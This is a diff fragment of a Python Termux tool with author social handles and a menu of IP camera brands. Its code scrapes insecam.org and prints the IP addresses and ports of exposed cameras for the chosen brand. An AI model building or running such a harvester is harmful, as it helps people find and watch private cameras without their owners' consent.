+            ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
+            ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            {yellow}[!]▪︎ {red}EXIT:{white+bold}CTRL+C
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {green}[<ID~>github] ▪︎  {white}https://github.com/mohammadmahdi-termux
+            {cyan}[<ID~>telegram] ▪︎  {white}@Mohammadmahdi_termux
+            {magenta}[<ID~>instagram] ▪︎  {white}@Mohammadmahditermux
+
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+                {red}01–{green}Dlink        {red}02–{green}DLink-DCS-932  {red}03– {green}TPLink        {red}04–{green}Foscam
+                {red}05–{green}Linksys      {red}06–{green}Sony           {red}07–{green}Sony-CS3       {red}08–{green}Vije
+                {red}09–{green}Mobotix      {red}10–{green}Panasonic      {red}11–{green}Megapixel      {red}12–{green}ChannelVision
+
+            {red}+𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺""")
+
+            try :
+                type_text(text)
+
+                MFs = ["DLink","DLink-DCS-932","TPLink","Foscam","Linksys","Sony","Sony-CS3","Vije","Mobotix","Panasonic","Megapixel" ,"ChannelVision"]
+
+
+                headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36"}
+                num = int(input(f"{yellow}[?]~>{red}Enter a number : "))
+                if num not in range(1, 13):
+                    raise IndexError
+
+                text= ""    
+                MF = MFs[num-1]
+                res = requests.get( f"http://www.insecam.org/en/bytype/{MF}",headers=headers )
+
+                last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
+
+                for page in range(int(last_page)):
+
+                    res = requests.get( f"http://www.insecam.org/en/bytype/{MF}/?page={page}", headers=headers )
+
+                    find_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", res.text)
+                    print(f"""\n{bold+yellow}@Mohammadmahdi_termux""")
+                    print(green+"")
+
+                    for ip in find_ip:
+                        print(ip)
+            except:
+                        print(red+" !ERORR❌ ")
+    else:
+        print(f"""{red}Please enter a number""")
+    # To go back to the first house
+    go_back = input(f"""{bold}{yellow}Do you want to step out of the tool?!  {green}n{white} / {red}y{blue} {white}: """)
+    if go_back.lower() not in ['no', 'n']:
+        print(f"""{red}Thanks for choosing me, don't forget to {yellow}star⭐️""")
+        break
+    else:
+        clear_terminal()
